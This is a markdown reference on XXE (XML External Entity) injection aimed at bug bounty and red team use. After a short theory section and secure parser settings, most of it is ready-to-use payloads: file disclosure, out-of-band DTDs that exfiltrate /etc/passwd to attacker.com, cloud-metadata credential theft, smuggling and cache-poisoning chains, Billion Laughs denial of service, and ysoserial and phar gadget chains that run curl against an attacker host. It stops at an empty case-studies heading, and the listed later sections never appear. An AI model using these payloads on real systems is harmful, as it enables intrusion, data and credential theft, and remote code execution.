# XXE (XML External Entity) Injection - Comprehensive Research Knowledgebase

> **Version**: Research-grade v1.0 | **Last Updated**: 2026-05-24
> **Purpose**: Advanced bug bounty hunting, black-box testing, and red team operations
> **Sources**: PortSwigger Research, HackTricks, OWASP, PayloadsAllTheThings, Nuclei Templates, W3C Specs, Real-World Case Studies

---

## Table of Contents

- [Basics](#basics)
- [XXE Theory](#xxe-theory)
- [XML Parser Internals](#xml-parser-internals)
- [XXE Payloads](#xxe-payloads)
- [Blind XXE Payloads](#blind-xxe-payloads)
- [OOB XXE Payloads](#oob-xxe-payloads)
- [SVG XXE Payloads](#svg-xxe-payloads)
- [XInclude Payloads](#xinclude-payloads)
- [SOAP XXE Payloads](#soap-xxe-payloads)
- [DOCX/OOXML XXE Payloads](#docx-ooxml-xxe-payloads)
- [File Upload + XXE Chains](#file-upload--xxe-chains)
- [SSRF + XXE Chains](#ssrf--xxe-chains)
- [Request Smuggling + XXE Chains](#request-smuggling--xxe-chains)
- [Cache Poisoning + XXE Chains](#cache-poisoning--xxe-chains)
- [OAuth + XXE Chains](#oauth--xxe-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [XML Parser Quirks](#xml-parser-quirks)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is XXE?

XML External Entity (XXE) Injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It occurs when an XML parser processes external entity references within XML documents without proper validation or restrictions.

### Core Impact

- **Arbitrary File Read**: Access local files (`/etc/passwd`, `C:\Windows\win.ini`, application config files)
- **SSRF**: Server-Side Request Forgery to internal services, cloud metadata endpoints
- **DoS**: Denial of Service via resource exhaustion (Billion Laughs attack)
- **RCE**: Remote Code Execution in specific configurations (PHP expect://, Java deserialization)
- **Information Disclosure**: Error messages, internal network data, sensitive configuration

### OWASP Classification

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **OWASP Top 10**: A04:2021 – Insecure Design (formerly A4:2017 – XML External Entities)

### When to Test for XXE

Test for XXE when you encounter:
- XML-based APIs (SOAP, REST with XML body)
- File upload features accepting XML-based formats (DOCX, XLSX, PPTX, SVG)
- SAML authentication endpoints
- RSS/Atom feed processors
- Configuration import/export features
- Document conversion services
- Office document previews/thumbnails
- SVG image processing
- PDF generation with XML input
- Any endpoint accepting `Content-Type: application/xml` or `text/xml`

---

## XXE Theory

### XML Document Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- Internal DTD subset -->
  <!ENTITY internal "This is an internal entity">
]>
<root>&internal;</root>
```

### Entity Types

| Type | Declaration | Behavior |
|------|-------------|----------|
| **Internal General Entity** | `<!ENTITY name "value">` | Replaced with declared text |
| **External General Entity** | `<!ENTITY name SYSTEM "uri">` | Fetches and includes remote resource |
| **External Parameter Entity** | `<!ENTITY % name SYSTEM "uri">` | Used in DTD, can define other entities |
| **Internal Parameter Entity** | `<!ENTITY % name "value">` | Used within DTD declarations |
| **Unparsed Entity** | `<!ENTITY name SYSTEM "uri" NDATA notation>`` | Binary data, not parsed |

### Key XML Specifications

- **XML 1.0 (Fifth Edition)**: Defines entity processing, DTD structure, well-formedness
- **XML Namespaces**: `xmlns` attributes, prefix resolution
- **XInclude 1.0**: `<xi:include>` for document composition
- **XML Base**: `xml:base` for relative URI resolution
- **XPointer Framework**: Fragment identifiers for XML subresources

### The XXE Attack Flow

```
1. Attacker identifies XML input vector
2. Crafts malicious XML with external entity declaration
3. Submits payload via API, file upload, or parameter
4. XML parser resolves external entity reference
5. Parser fetches resource (local file, remote URL)
6. Content is either:
   a) Returned in response (direct XXE)
   b) Triggered via OOB callback (blind XXE)
   c) Triggered via error message (error-based blind XXE)
```

---

## XML Parser Internals

### Parser Discrepancies (Critical for WAF Bypass)

Different XML parsers handle edge cases differently:

| Parser | External Entities | Parameter Entities | XInclude | DTD Processing | Notes |
|--------|-------------------|---------------------|----------|----------------|-------|
| **libxml2** (PHP, Python) | Configurable | Configurable | Supported | Full | Default: enabled in older versions |
| **Xerces** (Java) | Configurable | Configurable | Supported | Full | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| **.NET XmlReader** | Configurable | Configurable | No | Full | `DtdProcessing.Prohibit` |
| **Expat** | Configurable | Configurable | No | Full | `XML_PARAM_ENTITY_PARSING_NEVER` |
| **SAX (Python)** | Configurable | Configurable | No | Full | `make_parser()` defaults vary |
| **DOMParser (Browser)** | Disabled | Disabled | No | Partial | Modern browsers block external entities |
| **xml.etree (Python)** | Disabled | Disabled | No | None | Does not process DTD by default |
| **lxml (Python)** | Configurable | Configurable | Supported | Full | `resolve_entities=False` |

### Parser-Specific Security Features

#### Java (Xerces)
```java
// Secure configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

#### PHP (libxml2)
```php
// Secure configuration
libxml_disable_entity_loader(true);
libxml_use_internal_errors(true);
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET | LIBXML_DTDLOAD);
```

#### Python (lxml)
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
tree = etree.parse(xml_input, parser)
```

#### .NET
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

### XML Encoding Quirks

```xml
<!-- UTF-16 BOM can bypass some filters -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- UTF-7 encoding (legacy, rarely supported) -->
<?xml version="1.0" encoding="UTF-7"?>

<!-- ISO-8859-1 with entity references -->
<?xml version="1.0" encoding="ISO-8859-1"?>

<!-- EBCDIC (extremely rare, IBM systems) -->
<?xml version="1.0" encoding="EBCDIC-CP-US"?>
```

---

## XXE Payloads

### Basic File Disclosure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&xxe;</foo>
```

### Windows-Specific Paths

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Users/Public/Desktop/test.txt">
]>
<foo>&xxe;</foo>
```

### PHP Wrapper Exploitation

```xml
<!-- PHP filter wrapper - Base64 encode source code -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
```

```xml
<!-- PHP expect wrapper - RCE (if expect module enabled) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

```xml
<!-- PHP phar wrapper - Deserialization -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "phar:///var/www/uploads/exploit.phar">
]>
<foo>&xxe;</foo>
```

### Alternative Protocols

```xml
<!-- HTTP/HTTPS SSRF -->
<!ENTITY xxe SYSTEM "http://internal-api.local/admin">
```

```xml
<!-- FTP protocol -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:2121/">
```

```xml
<!-- Dict protocol (rare) -->
<!ENTITY xxe SYSTEM "dict://localhost:2628/">
```

```xml
<!-- Gopher protocol (if supported) -->
<!ENTITY xxe SYSTEM "gopher://localhost:9000/_GET / HTTP/1.1">
```

### Parameter Entity Variants

```xml
<!-- Parameter entity for bypassing restrictions -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY exfil "<!ENTITY xxe2 SYSTEM 'http://attacker.com/?%xxe;'>">
  %exfil;
]>
<foo>&xxe2;</foo>
```

---

## Blind XXE Payloads

### Out-of-Band (OOB) Data Exfiltration

```xml
<!-- OOB XXE - External DTD on attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

**Attacker DTD (`evil.dtd`)**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
```

### DNS Exfiltration (for restricted outbound HTTP)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

**Attacker DTD with DNS exfiltration**:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
```

### Error-Based Blind XXE

```xml
<!-- Trigger error containing file contents -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

### Local DTD Repurposing (No External Connection)

When outbound connections are blocked, repurpose a local DTD file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;">">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>test</foo>
```

**Common Local DTD Files to Test**:
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/schema/docbook/catalog.xml
/usr/share/xml/entities/docbook.ent
/usr/share/xml/schema/struts/struts-config_1_1.dtd
/usr/share/xml/schema/web-app/web-app_2_3.dtd
/opt/jboss/jboss-eap-6.4/docs/schema/jbossas/jboss-web_7_2.xsd
/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
```

---

## OOB XXE Payloads

### Complete OOB Exfiltration Setup

**Step 1: Attacker Server Setup**
```bash
# Python simple HTTP server for callback
python3 -m http.server 80

# Or use Interactsh for OOB detection
interactsh-client
```

**Step 2: Malicious DTD**
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com:80/?data=%file;'>">
%eval;
```

**Step 3: XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com:80/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

### OOB with Parameter Entity Chaining

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % a SYSTEM "http://attacker.com:80/stage1">
  %a;
]>
<data>&b;</data>
```

**Stage 1 DTD** (`stage1`):
```xml
<!ENTITY % c SYSTEM "file:///etc/passwd">
<!ENTITY % d "<!ENTITY b SYSTEM 'http://attacker.com:80/?%c;'>">
%d;
```

### OOB via FTP (for restricted environments)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "ftp://attacker.com:21/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

---

## SVG XXE Payloads

### Basic SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### SVG with Image Tag XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="&xxe;" width="100" height="100"/>
</svg>
```

### SVG with ForeignObject

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <p>&xxe;</p>
    </div>
  </foreignObject>
</svg>
```

### SVG with XInclude

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</svg>
```

### SVG via Data URI (Browser Context)

```html
<!-- In HTML, SVG can trigger XXE if parsed by vulnerable server-side component -->
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0ZXh0Png8L3RleHQ+PC9zdmc+" />
```

---

## XInclude Payloads

### Basic XInclude File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### XInclude with Fallback

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text">
    <xi:fallback>File not found</xi:fallback>
  </xi:include>
</root>
```

### XInclude with XPointer

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" xpointer="xpointer(string-range(/,''))" parse="text"/>
</root>
```

### XInclude SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal-api.local/admin" parse="text"/>
</root>
```

### XInclude via SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <root xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include href="file:///etc/passwd" parse="text"/>
    </root>
  </soap:Body>
</soap:Envelope>
```

---

## SOAP XXE Payloads

### Basic SOAP XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <username>&xxe;</username>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### SOAP with WSDL XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soap:Body>
    <ns1:getUser xmlns:ns1="http://tempuri.org/">
      <ns1:username xsi:type="xsd:string">&xxe;</ns1:username>
    </ns1:getUser>
  </soap:Body>
</soap:Envelope>
```

### SOAP with XInclude

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <processXML xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include href="file:///etc/passwd" parse="text"/>
    </processXML>
  </soap:Body>
</soap:Envelope>
```

### SOAP with Parameter Entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <username>&exfil;</username>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## DOCX/OOXML XXE Payloads

### OOXML Structure Overview

Office documents (DOCX, XLSX, PPTX) are ZIP archives containing XML files:
```
document.docx
├── [Content_Types].xml
├── _rels/.rels
├── word/
│   ├── document.xml      <-- Main content (target for XXE)
│   ├── _rels/document.xml.rels
│   └── styles.xml
├── docProps/
│   └── core.xml
└── _rels/
```

### Manual DOCX XXE Injection

```bash
# 1. Unzip the DOCX
unzip document.docx -d docx_extracted/

# 2. Edit word/document.xml to add XXE payload
# Add DOCTYPE and entity reference to document.xml

# 3. Repackage (must preserve ZIP structure)
cd docx_extracted/
zip -r ../malicious.docx .
```

**Modified `word/document.xml`**:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

### XLSX XXE Injection (using XXElixir)

```bash
# Using XXElixir tool
python3 XXElixir.py --file template.xlsx --url https://attacker.com/xxe --output poisoned.xlsx

# Custom payload
python3 XXElixir.py --file template.xlsx --xxe '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' --output poisoned.xlsx
```

### PPTX XXE Injection

```bash
# Similar to DOCX, target ppt/slides/slide1.xml
unzip presentation.pptx -d pptx_extracted/
# Edit ppt/slides/slide1.xml with XXE payload
zip -r ../malicious.pptx pptx_extracted/
```

### ODT (OpenDocument) XXE

```bash
unzip document.odt -d odt_extracted/
# Edit content.xml with XXE payload
zip -r ../malicious.odt odt_extracted/
```

---

## File Upload + XXE Chains

### Attack Chain Overview

```
1. Attacker uploads malicious XML-based file (SVG, DOCX, XLSX)
2. Server processes file (thumbnail generation, preview, conversion)
3. XML parser resolves embedded XXE payload
4. File contents or server data exfiltrated
```

### SVG Upload to XXE

```xml
<!-- Upload as profile picture, avatar, etc. -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### ImageMagick + SVG XXE Chain

ImageMagick processes SVG for image conversion:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <image href="&xxe;" width="100" height="100"/>
</svg>
```

### PDF Upload + XXE (via XFA)

Some PDF processors use XFA (XML Forms Architecture):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xfa [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
  <xfa:data>&xxe;</xfa:data>
</xfa:datasets>
```

### XXE via Excel Import (CSV to XLSX)

Applications that convert CSV to XLSX server-side:
```bash
# Upload CSV that gets converted to XLSX
# The conversion tool may use XML processing vulnerable to XXE
```

---

## SSRF + XXE Chains

### XXE to Internal Network Scanning

```xml
<!-- Scan internal ports via error timing -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<foo>&xxe;</foo>
```

```xml
<!-- Scan via different protocols -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://10.0.0.1:8080">
<!ENTITY xxe SYSTEM "http://172.16.0.1:3306">
```

### XXE to Cloud Metadata

**AWS Metadata Service**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

**GCP Metadata Service**:
```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```

**Azure Metadata Service**:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2017-08-01">
```

**DigitalOcean**:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/v1/id">
```

### XXE to Internal API Access

```xml
<!-- Access internal APIs that are localhost-only -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/api/users">
]>
<foo>&xxe;</foo>
```

### SSRF via XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal-service.local/api" parse="text"/>
</root>
```

---

## Request Smuggling + XXE Chains

### CL.TE Desync + XXE

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

59
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
0

GET / HTTP/1.1
Host: target.com
```

### TE.CL Desync + XXE

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

### H2.TE Downgrade + XXE

HTTP/2 to HTTP/1.1 downgrade with TE header injection:
```
:method POST
:path /api/xml
:authority target.com
content-type application/xml
transfer-encoding chunked

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

### Browser-Powered Desync + XXE

```javascript
// CSD (Client-Side Desync) triggering XXE
fetch('https://target.com/api/xml', {
  method: 'POST',
  body: 'POST /internal HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  credentials: 'include'
})
```

---

## Cache Poisoning + XXE Chains

### Web Cache Poisoning via Unkeyed Headers + XXE

```http
POST /api/xml HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Cache Key Injection + XXE

Exploiting cache key normalization to poison XML responses:
```http
POST /api/xml?cb=1 HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Fat GET + XXE Cache Poisoning

```http
GET /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

---

## OAuth + XXE Chains

### OAuth Dynamic Client Registration SSRF → XXE

OAuth registration endpoints accept URL parameters that are later fetched:
```json
POST /connect/register HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "redirect_uris": ["https://client.example.org/callback"],
  "logo_uri": "http://attacker.com/logo.svg",
  "jwks_uri": "http://attacker.com/keys.jwks",
  "sector_identifier_uri": "http://attacker.com/redirect_uris.json"
}
```

The server fetches `logo_uri` to display the client logo. If the response is processed as XML:
```xml
<!-- attacker.com/logo.svg -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

### OAuth request_uri XXE

```http
GET /authorize?response_type=code&client_id=sclient1&request_uri=https://attacker.com/request.jwt HTTP/1.1
Host: oauth-server.com
```

The server fetches `request_uri` and may process the JWT payload as XML.

### SAML XXE in OAuth/SAML Flows

SAML endpoints are XML parsers and frequently vulnerable:
```xml
<!-- SAMLRequest parameter (Base64 encoded then URL decoded) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

---

## Parser Confusion Payloads

### Content-Type Confusion

```http
POST /api/process HTTP/1.1
Host: target.com
Content-Type: application/json

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### XML inside JSON

```json
{
  "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"
}
```

### XML inside Multipart

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="xml_data"

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
------WebKitFormBoundary--
```

### XML inside GraphQL

```graphql
mutation {
  processXML(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>")
}
```

---

## XML Parser Quirks

### DTD Processing Differences

```xml
<!-- Some parsers allow DTD in internal subset only -->
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
  %ext;
]>
<root>&xxe;</root>
```

### Entity Reference Expansion Limits

```xml
<!-- Billion Laughs - Exponential expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... up to lol9 for ~3 billion expansions -->
]>
<lolz>&lol9;</lolz>
```

### Namespace Confusion

```xml
<!-- Default namespace vs prefixed -->
<root xmlns="http://default.ns">
  <ns:child xmlns:ns="http://other.ns">&xxe;</ns:child>
</root>
```

### CDATA Section Handling

```xml
<!-- Some parsers process entities inside CDATA -->
<root><![CDATA[&xxe;]]></root>
```

### Processing Instruction Injection

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/style.xsl"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

---

## Browser Quirks

### DOMParser XXE (Client-Side)

```javascript
// Modern browsers disable external entities in DOMParser
const parser = new DOMParser();
const xmlDoc = parser.parseFromString(xmlString, "application/xml");
// External entities are NOT resolved in browsers
```

### SVG in Browser Context

```html
<!-- SVG loaded directly in browser does NOT resolve external entities -->
<img src="image.svg">  <!-- Safe in modern browsers -->
<object data="image.svg"></object>  <!-- Safe -->
```

### iframe + XML

```html
<!-- iframe loading XML may trigger server-side processing -->
<iframe src="/api/getConfig?format=xml"></iframe>
```

### fetch() with XML Response

```javascript
fetch('/api/data')
  .then(r => r.text())
  .then(xml => {
    // Client-side parsing - safe from XXE
    const doc = new DOMParser().parseFromString(xml, 'application/xml');
  });
```

---

## Gadget Chains

### Java Deserialization via XXE

**Chain**: XXE → File Read → Upload Serialized Object → Deserialization → RCE

```java
// Step 1: Generate ysoserial payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.ser
```

```xml
<!-- Step 2: Upload payload via any file upload -->
<!-- Step 3: Trigger deserialization via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///app/uploads/12345/payload.ser">
]>
<request>
  <data>&xxe;</data>
</request>
```

### PHP Phar Deserialization

```php
// Create malicious PHAR
<?php
class Exploit {
    public function __destruct() {
        system('curl http://attacker.com/pwned');
    }
}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->stopBuffering();
?>
```

```xml
<!-- Trigger via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "phar:///var/www/uploads/exploit.phar">
]>
<data>&xxe;</data>
```

### XXE to Log Poisoning → RCE

```xml
<!-- Read log files to find injection points -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">
]>
<foo>&xxe;</foo>
```

---

## Real World Case Studies

